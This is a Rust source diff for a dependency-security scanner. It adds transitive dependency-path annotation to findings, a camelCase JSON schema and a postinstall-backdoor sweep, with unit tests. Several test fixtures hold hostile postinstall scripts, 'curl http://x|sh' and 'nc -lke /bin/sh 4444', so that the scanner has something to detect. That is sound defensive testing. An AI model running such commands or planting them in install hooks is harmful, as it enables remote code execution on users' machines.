@@ -20,13 +20,38 @@ use std::process::Command;
 use std::time::Duration;
 
 use regex::Regex;
+use serde::Serialize;
 
 use crate::osv::{self, OsvVuln};
 use crate::osv_cache::{cache_key, OsvCache, DEFAULT_TTL_SECS};
 use crate::threat_db::{is_compromised, normalize_name, Threat};
+use crate::{sca_graph, sca_lockfile, sca_postinstall};
 
 /// One finding row. Field-for-field with the Python `Finding` dataclass.
-#[derive(Debug, Clone, PartialEq, Eq)]
+///
+/// # JSON contract
+///
+/// `Serialize` is derived with `rename_all = "camelCase"` so the new
+/// `paths` / `path_count` fields surface as `paths` and `pathCount` —
+/// matching the existing camelCase convention used by `arcis scan
+/// --json` (`durationMs`, `routesTotal`) and `arcis audit --json`. No
+/// user-facing `arcis sca --json` mode exists yet, but locking the
+/// schema now prevents a rename when one ships.
+///
+/// # Path metadata semantics
+///
+/// `paths` and `path_count` are only populated by
+/// [`scan_project_with_paths`] and [`scan_project_with_osv_paths`]; the
+/// pre-existing [`scan_project`] / [`scan_project_with_osv`] flows leave
+/// them empty/zero so callers that don't care about transitive depth
+/// don't pay the graph-build cost. Invariant: `path_count == paths.len()`
+/// after annotation; `0` / `Vec::new()` means "no path data attached".
+///
+/// `paths` lists every shortest root → parent chain (target excluded);
+/// see [`crate::sca_graph::DepGraph::all_paths_to`] for tie-break and
+/// cap behaviour.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "camelCase")]
 pub struct Finding {
     pub package: String,
     pub ecosystem: String,
@@ -38,9 +63,21 @@ pub struct Finding {
     pub source: String,
     pub references: Vec<String>,
     pub finding_type: FindingType,
+    /// Shortest root → parent chains for this finding. Each inner vec
+    /// is package names target-excluded; depth equals `paths[i].len()`.
+    /// Empty when no graph was available (Pipfile.lock / yarn Berry /
+    /// the legacy non-paths entry points).
+    pub paths: Vec<Vec<String>>,
+    /// Number of distinct paths discovered, equal to `paths.len()`.
+    /// Kept as a separate field so JSON consumers don't have to
+    /// `.length` the array client-side, and so future variants can
+    /// summarise (e.g. expose count without the chain when a flag
+    /// trims the array).
+    pub path_count: usize,
 }
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "snake_case")]
 pub enum FindingType {
     /// Standard hit: an exact malicious version or a vulnerable range.
     CompromisedVersion,
@@ -153,6 +190,8 @@ fn scan_package_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::CompromisedVersion,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
 
@@ -171,6 +210,8 @@ fn scan_package_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::TrojanizedDep,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
         }
@@ -194,6 +235,8 @@ fn scan_package_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::CompromisedVersion,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
         }
@@ -241,6 +284,8 @@ fn scan_yarn_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::CompromisedVersion,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
         }
@@ -261,6 +306,8 @@ fn scan_yarn_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::TrojanizedDep,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
         }
@@ -295,6 +342,8 @@ fn scan_node_modules(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                             source: threat.source.clone(),
                             references: threat.references.clone(),
                             finding_type: FindingType::CompromisedVersion,
+                            paths: Vec::new(),
+                            path_count: 0,
                         });
                     }
                 }
@@ -317,6 +366,8 @@ fn scan_node_modules(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::TrojanizedDep,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
         }
@@ -376,6 +427,8 @@ fn scan_requirements(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                         source: threat.source.clone(),
                         references: threat.references.clone(),
                         finding_type: FindingType::CompromisedVersion,
+                        paths: Vec::new(),
+                        path_count: 0,
                     });
                 }
             }
@@ -413,6 +466,8 @@ fn scan_requirements(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                             source: threat.source.clone(),
                             references: threat.references.clone(),
                             finding_type: FindingType::CompromisedVersion,
+                            paths: Vec::new(),
+                            path_count: 0,
                         });
                     }
                 }
@@ -457,6 +512,8 @@ fn scan_requirements(path: &Path, threats: &[Threat]) -> Vec<Finding> {
                                     source: threat.source.clone(),
                                     references: threat.references.clone(),
                                     finding_type: FindingType::CompromisedVersion,
+                                    paths: Vec::new(),
+                                    path_count: 0,
                                 });
                             }
                         }
@@ -524,6 +581,8 @@ fn scan_pip_installed(threats: &[Threat]) -> Vec<Finding> {
                     source: threat.source.clone(),
                     references: threat.references.clone(),
                     finding_type: FindingType::CompromisedVersion,
+                    paths: Vec::new(),
+                    path_count: 0,
                 });
             }
         }
@@ -587,7 +646,7 @@ fn scan_pth_backdoors() -> Vec<Finding> {
                         references: vec![
                             "https://github.com/BerriAI/litellm/security/advisories".into(),
                         ],
-                        finding_type: FindingType::PersistenceArtifact,
+                        finding_type: FindingType::PersistenceArtifact, paths: Vec::new(), path_count: 0,
                     });
                     break;
                 }
@@ -628,6 +687,12 @@ fn locate_site_packages() -> Vec<PathBuf> {
 /// globally installed pip packages and walk site-packages for `.pth`
 /// persistence artifacts.
 ///
+/// The postinstall sweep runs unconditionally: it walks only the
+/// project-local `node_modules/` (and the explicit `.pnpm` store path),
+/// so there's no system-side cost the way the `.pth` site-packages walk
+/// has — gating it behind `check_system` would silently miss the very
+/// supply-chain attacks SCA exists to catch.
+///
 /// Findings are deduplicated by `(package, version, location)` to mirror
 /// Python's `seen` set.
 pub fn scan_project(path: &Path, check_system: bool, threats: &[Threat]) -> Vec<Finding> {
@@ -635,6 +700,7 @@ pub fn scan_project(path: &Path, check_system: bool, threats: &[Threat]) -> Vec<
     findings.extend(scan_package_lock(path, threats));
     findings.extend(scan_yarn_lock(path, threats));
     findings.extend(scan_node_modules(path, threats));
+    findings.extend(sca_postinstall::scan_postinstall_backdoors(path));
     findings.extend(scan_requirements(path, threats));
     if check_system {
         findings.extend(scan_pip_installed(threats));
@@ -883,6 +949,8 @@ pub fn osv_to_finding(pkg: &PackageRef, vuln: &OsvVuln) -> Finding {
         source: format!("osv:{}", vuln.id),
         references,
         finding_type: FindingType::CompromisedVersion,
+        paths: Vec::new(),
+        path_count: 0,
     }
 }
 
@@ -1032,6 +1100,106 @@ pub fn augment_with_osv(packages: &[PackageRef], opts: &OsvOptions) -> Vec<Findi
     }
 
     findings
+}
+
+// ── transitive depth annotation layer (cli-sca.md Phase C item 5) ────────
+
+/// Default cap on the number of distinct shortest paths recorded per
+/// finding. Bounds output size on diamond-heavy graphs; see
+/// [`crate::sca_graph::DepGraph::all_paths_to`] for the empirical
+/// rationale.
+pub const DEFAULT_PATH_CAP: usize = 8;
+
+/// Per-lockfile graph status, returned alongside annotated findings so
+/// the CLI can render an honest "Paths: X (graph), Y (flat)" banner row
+/// whenever at least one lockfile in the scan couldn't yield a graph.
+#[derive(Debug, Clone)]
+pub struct LockfileGraphInfo {
+    pub path: PathBuf,
+    pub format: sca_lockfile::LockfileFormat,
+    pub graph_supported: bool,
+}
+
+/// Output of [`scan_project_with_paths`] / [`scan_project_with_osv_paths`].
+/// The findings are already path-annotated; `lockfiles` is the per-format
+/// summary the CLI banner needs to honestly indicate which lockfiles
+/// have transitive data and which are flat.
+#[derive(Debug, Clone)]
+pub struct PathScanResult {
+    pub findings: Vec<Finding>,
+    pub lockfiles: Vec<LockfileGraphInfo>,
+}
+
+/// Embedded-DB scan that additionally annotates each finding with its
+/// shortest dependency paths from the project root. Wraps [`scan_project`]
+/// — the underlying threat-matching is identical, only the post-processing
+/// differs.
+pub fn scan_project_with_paths(
+    path: &Path,
+    check_system: bool,
+    threats: &[Threat],
+) -> PathScanResult {
+    let findings = scan_project(path, check_system, threats);
+    annotate_findings_with_paths(path, findings)
+}
+
+/// Embedded-DB + OSV scan with path annotation. Wraps
+/// [`scan_project_with_osv`]; OSV-only findings flow through the same
+/// path resolver as embedded ones.
+pub fn scan_project_with_osv_paths(
+    path: &Path,
+    check_system: bool,
+    threats: &[Threat],
+    osv_opts: &OsvOptions,
+) -> PathScanResult {
+    let findings = scan_project_with_osv(path, check_system, threats, osv_opts);
+    annotate_findings_with_paths(path, findings)
+}
+
+/// Build per-lockfile graphs once, then annotate every finding by
+/// matching `Finding.location` against the lockfile that produced its
+/// graph. Findings whose location doesn't map to a graph-supported
+/// lockfile (e.g. Pipfile.lock, yarn Berry, `node_modules/` walks) keep
+/// the empty defaults.
+fn annotate_findings_with_paths(project_path: &Path, mut findings: Vec<Finding>) -> PathScanResult {
+    let lockfile_paths = sca_lockfile::discover_lockfiles(project_path);
+    let mut lockfiles: Vec<LockfileGraphInfo> = Vec::new();
+    let mut graphs: Vec<(PathBuf, sca_graph::DepGraph)> = Vec::new();
+
+    for lockfile_path in lockfile_paths {
+        let format = match sca_lockfile::detect_format(&lockfile_path) {
+            Some(f) => f,
+            None => continue,
+        };
+        let graph = sca_lockfile::build_graph(&lockfile_path);
+        let graph_supported = graph.is_some();
+        if let Some(g) = graph {
+            graphs.push((lockfile_path.clone(), g));
+        }
+        lockfiles.push(LockfileGraphInfo {
+            path: lockfile_path,
+            format,
+            graph_supported,
+        });
+    }
+
+    for f in &mut findings {
+        for (lf_path, graph) in &graphs {
+            if f.location == lf_path.display().to_string() {
+                if let Some(node_id) = graph.find_node(&f.ecosystem, &f.package, &f.version) {
+                    let paths = graph.all_paths_to(node_id, DEFAULT_PATH_CAP);
+                    f.path_count = paths.len();
+                    f.paths = paths;
+                }
+                break;
+            }
+        }
+    }
+
+    PathScanResult {
+        findings,
+        lockfiles,
+    }
 }
 
 #[cfg(test)]
@@ -1475,5 +1643,237 @@ mod tests {
         assert_eq!(osv_only.len(), 1);
         assert!(osv_only[0].source.starts_with("osv:"));
         assert_eq!(osv_only[0].severity, "high");
+    }
+
+    // ── path-annotation layer (item 5) ────────────────────────────────────
+
+    #[test]
+    fn finding_default_paths_empty_and_path_count_zero() {
+        // Embedded scan path leaves the new fields untouched so callers
+        // that don't opt into the path layer don't pay graph-build cost.
+        let dir = tempdir();
+        let body = r#"{
+            "lockfileVersion": 3,
+            "packages": {
+                "node_modules/axios": {"version": "1.14.1"}
+            }
+        }"#;
+        fs::write(dir.path().join("package-lock.json"), body).unwrap();
+        let threats = Threat::load_all();
+        let findings = scan_project(dir.path(), false, &threats);
+        let axios = findings.iter().find(|f| f.package == "axios").unwrap();
+        assert!(axios.paths.is_empty());
+        assert_eq!(axios.path_count, 0);
+    }
+
+    #[test]
+    fn scan_project_with_paths_annotates_direct_dep() {
+        let dir = tempdir();
+        let body = r#"{
+            "name": "your-app",
+            "lockfileVersion": 3,
+            "packages": {
+                "": {"name": "your-app", "version": "1.0.0", "dependencies": {"axios": "^1"}},
+                "node_modules/axios": {"version": "1.14.1"}
+            }
+        }"#;
+        fs::write(dir.path().join("package-lock.json"), body).unwrap();
+        let threats = Threat::load_all();
+        let result = scan_project_with_paths(dir.path(), false, &threats);
+        let axios = result
+            .findings
+            .iter()
+            .find(|f| f.package == "axios")
+            .unwrap();
+        assert_eq!(axios.path_count, 1);
+        assert_eq!(axios.paths, vec![vec!["your-app".to_string()]]);
+    }
+
+    #[test]
+    fn scan_project_with_paths_annotates_transitive_diamond() {
+        let dir = tempdir();
+        let body = r#"{
+            "lockfileVersion": 3,
+            "packages": {
+                "": {"name": "your-app", "version": "1.0.0", "dependencies": {"alpha": "^1", "bravo": "^1"}},
+                "node_modules/alpha": {"version": "1.0.0", "dependencies": {"axios": "^1"}},
+                "node_modules/bravo": {"version": "1.0.0", "dependencies": {"axios": "^1"}},
+                "node_modules/axios": {"version": "1.14.1"}
+            }
+        }"#;
+        fs::write(dir.path().join("package-lock.json"), body).unwrap();
+        let threats = Threat::load_all();
+        let result = scan_project_with_paths(dir.path(), false, &threats);
+        let axios = result
+            .findings
+            .iter()
+            .find(|f| f.package == "axios")
+            .unwrap();
+        assert_eq!(axios.path_count, 2, "diamond should yield 2 paths");
+        // Each path is depth 2 (root → alpha/bravo, axios excluded).
+        for p in &axios.paths {
+            assert_eq!(p.len(), 2);
+            assert_eq!(p[0], "your-app");
+        }
+    }
+
+    #[test]
+    fn scan_project_with_paths_marks_pipfile_as_flat() {
+        let dir = tempdir();
+        let body = r#"{
+            "_meta": {"hash": {"sha256": "x"}},
+            "default": {"axios": {"version": "==1.14.1"}}
+        }"#;
+        fs::write(dir.path().join("Pipfile.lock"), body).unwrap();
+        let threats = Threat::load_all();
+        let result = scan_project_with_paths(dir.path(), false, &threats);
+        let pipfile_info = result
+            .lockfiles
+            .iter()
+            .find(|l| l.format == sca_lockfile::LockfileFormat::PipfileLock)
+            .expect("Pipfile.lock should be discovered");
+        assert!(!pipfile_info.graph_supported);
+    }
+
+    #[test]
+    fn scan_project_with_paths_lockfiles_lists_npm_v3_as_supported() {
+        let dir = tempdir();
+        let body = r#"{
+            "lockfileVersion": 3,
+            "packages": {"": {}, "node_modules/x": {"version": "1.0.0"}}
+        }"#;
+        fs::write(dir.path().join("package-lock.json"), body).unwrap();
+        let threats = Threat::load_all();
+        let result = scan_project_with_paths(dir.path(), false, &threats);
+        assert_eq!(result.lockfiles.len(), 1);
+        assert!(result.lockfiles[0].graph_supported);
+    }
+
+    #[test]
+    fn finding_serializes_path_count_as_camel_case() {
+        // Sentinel-pin: locks the JSON schema so any future renamer
+        // (e.g. someone adding `arcis sca --json`) sees the camelCase
+        // contract on day one. We assert against the literal serialized
+        // text rather than going through serde_json::Value lookups so a
+        // rename is caught in the diff, not just by clients.
+        let f = Finding {
+            package: "axios".into(),
+            ecosystem: "npm".into(),
+            version: "1.14.1".into(),
+            severity: "critical".into(),
+            location: "/p".into(),
+            attack_vector: String::new(),
+            remediation: String::new(),
+            source: String::new(),
+            references: Vec::new(),
+            finding_type: FindingType::CompromisedVersion,
+            paths: vec![vec!["root".into(), "a".into()]],
+            path_count: 1,
+        };
+        let json = serde_json::to_string(&f).unwrap();
+        assert!(
+            json.contains("\"pathCount\":1"),
+            "expected pathCount in {json}"
+        );
+        assert!(
+            json.contains("\"paths\":[[\"root\",\"a\"]]"),
+            "expected paths in {json}"
+        );
+        assert!(
+            json.contains("\"findingType\":\"compromised_version\""),
+            "expected camelCase findingType + snake_case enum value in {json}"
+        );
+        assert!(
+            json.contains("\"attackVector\":"),
+            "expected camelCase attackVector in {json}"
+        );
+    }
+
+    // ── postinstall sweep wire-up (item 8) ───────────────────────────
+
+    #[test]
+    fn scan_project_runs_postinstall_sweep_unconditionally() {
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
+        );
+        let threats = Threat::load_all();
+        // check_system=false: postinstall sweep still runs because it's
+        // project-local and has no system side effects.
+        let findings = scan_project(dir.path(), false, &threats);
+        let postinstall_hits: Vec<&Finding> = findings
+            .iter()
+            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .collect();
+        assert_eq!(
+            postinstall_hits.len(),
+            1,
+            "scan_project must wire postinstall sweep regardless of check_system"
+        );
+        assert_eq!(postinstall_hits[0].package, "evil");
+        assert!(postinstall_hits[0].location.ends_with(":postinstall"));
+    }
+
+    #[test]
+    fn scan_project_dedupes_postinstall_findings() {
+        // Two entries with identical (package, version, location) get
+        // collapsed by the seen-set; here we just assert the wire-up
+        // doesn't duplicate-emit on a single manifest with one bad script.
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
+        );
+        let threats = Threat::load_all();
+        let findings = scan_project(dir.path(), false, &threats);
+        let postinstall: Vec<&Finding> = findings
+            .iter()
+            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .collect();
+        assert_eq!(postinstall.len(), 1, "single bad script → single finding");
+    }
+
+    #[test]
+    fn scan_project_with_paths_leaves_postinstall_path_data_empty() {
+        // Postinstall findings carry `location = "<manifest>:postinstall"`
+        // which doesn't match any lockfile path, so the graph annotator
+        // must leave paths/path_count at the defaults set by build_finding.
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"nc -lke /bin/sh 4444"}}"#,
+        );
+        let threats = Threat::load_all();
+        let result = scan_project_with_paths(dir.path(), false, &threats);
+        let postinstall: Vec<&Finding> = result
+            .findings
+            .iter()
+            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .collect();
+        assert_eq!(postinstall.len(), 1);
+        assert!(postinstall[0].paths.is_empty());
+        assert_eq!(postinstall[0].path_count, 0);
+    }
+
+    #[test]
+    fn scan_project_postinstall_attack_vector_cites_event_stream() {
+        // Pin the historical-incident reference so it doesn't drift to
+        // a generic "supply chain attack" string. event-stream and
+        // ua-parser-js are the load-bearing precedents this sweep targets.
+        let dir = tempdir();
+        write(
+            &dir.path().join("node_modules/evil/package.json"),
+            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
+        );
+        let threats = Threat::load_all();
+        let findings = scan_project(dir.path(), false, &threats);
+        let v = &findings
+            .iter()
+            .find(|f| f.finding_type == FindingType::PersistenceArtifact)
+            .expect("postinstall finding")
+            .attack_vector;
+        assert!(v.contains("event-stream"), "must cite event-stream");
+        assert!(v.contains("ua-parser-js"), "must cite ua-parser-js");
     }
 }
